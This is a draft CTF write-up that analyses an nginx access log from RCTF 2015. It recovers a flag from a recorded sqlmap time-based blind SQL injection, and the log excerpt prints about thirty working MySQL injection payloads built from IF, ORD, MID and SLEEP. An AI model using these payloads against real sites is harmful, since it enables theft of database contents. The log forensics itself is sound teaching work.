Title: CTF writeup - RCTF 2015 Quals: Analysis nginx's log
Category: Security
Tags: ctf,sqli
Summary: Analysis of a blind SQL Injection in logs
Status: draft


> Challenge: Find the flag in an nginx log file.

The first thing I did is to search for the string `flag`, which found a blind SQL Injection performed by sqlmap.
I extracted those URL-encoded entries then converted them to readable text using [asciitohex](http://www.asciitohex.com), which gave lines like these:

```
:::text hl_lines="8 16 24 32"

192.168.52.1 - - [06/Nov/2015:19:33:07 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:07 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>88),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>84),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:08 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))>81),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:09 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),1,1))!=82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:10 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:11 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>72),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:12 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>76),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>78),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))>79),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:13 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),2,1))!=79),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:14 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>72),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>76),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>74),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))>73),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:15 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),3,1))!=73),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:16 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>64),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:16 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>96),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>80),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>88),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:17 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>84),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>82),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))>83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
192.168.52.1 - - [06/Nov/2015:19:33:18 -0800] "GET /phpcode/rctf/misc/index.php?id=1 AND 7500=IF((ORD(MID((SELECT IFNULL(CAST(flag AS CHAR),0x20) FROM misc.flag ORDER BY flag LIMIT 0,1),4,1))!=83),SLEEP(1),7500) HTTP/1.1" 200 5 "-" "sqlmap/1.0-dev (http://sqlmap.org)" "-"
```

We can see that sqlmap tries to find characters of the flag one by one by casting them to CHAR then by comparing the decimal value.
The interesting part (highlighted) is when it confirms that it found the character by checking for equality (`!=`).
Then it goes to the next character: `LIMIT 0,1),1,1` becomes `LIMIT 0,1),2,1`.

So we can find the flag value by extracting every character after a `!=`. I used Sublime Text's search + multi-select for this, but you can do some vim or regex magic too.
Pasting these characters in my good old friend [asciitohex](http://www.asciitohex.com) revealed the flag.
In the snippet above, you can find the first 4 letters: `ROIS`.
